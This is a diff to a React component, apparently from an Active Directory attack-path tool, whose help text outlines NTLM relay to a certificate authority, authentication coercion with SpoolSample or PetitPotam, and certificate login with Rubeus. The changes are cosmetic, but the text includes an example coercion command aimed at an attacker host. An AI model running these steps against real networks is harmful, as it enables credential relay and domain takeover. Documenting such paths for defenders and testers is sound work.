@@ -22,32 +22,35 @@ import { EdgeInfoProps } from '../index';
 const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
-            <Typography variant={'body1'}>1. Start the Relay Server</Typography>
-            <Typography variant={'body2'}>
+            <Typography variant='body1'>1. Start the Relay Server</Typography>
+            <Typography variant='body2'>
                 The NTLM relay can be executed with tools like{' '}
-                <Link target='_blank' rel='noopener' href='https://github.com/Kevin-Robertson/Inveigh'>
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Kevin-Robertson/Inveigh'>
                     Inveigh
                 </Link>
                 , targeting the RPC endpoint of the enterprise CA server.
             </Typography>
-            <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
-            <Typography variant='body2'>
+            <Typography variant='body1'>2. Coerce the Target Computer</Typography>
+            <Typography variant='body2' component='div'>
                 Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
-                    rel='noopener'
+                    rel='noopener noreferrer'
                     href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                     Windows Coerced Authentication Methods
                 </Link>
                 . Examples of tools include:
-                <ul>
+                <ul style={{ paddingLeft: '1.5em' }}>
                     <li>
-                        <Link target='_blank' rel='noopener' href='https://github.com/leechristensen/SpoolSample'>
+                        <Link
+                            target='_blank'
+                            rel='noopener noreferrer'
+                            href='https://github.com/leechristensen/SpoolSample'>
                             SpoolSample
                         </Link>
                     </li>
                     <li>
-                        <Link target='_blank' rel='noopener' href='https://github.com/topotam/PetitPotam'>
+                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/topotam/PetitPotam'>
                             PetitPotam
                         </Link>
                     </li>
@@ -58,10 +61,10 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
                 Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
             </Typography>
             <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
-            <Typography variant={'body1'}>3. Perform Certificate Authentication</Typography>
+            <Typography variant='body1'>3. Perform Certificate Authentication</Typography>
             <Typography variant='body2'>
                 Authenticate using the certificate obtained as the target principal, for example by using{' '}
-                <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/GhostPack/Rubeus'>
                     Rubeus
                 </Link>
                 .
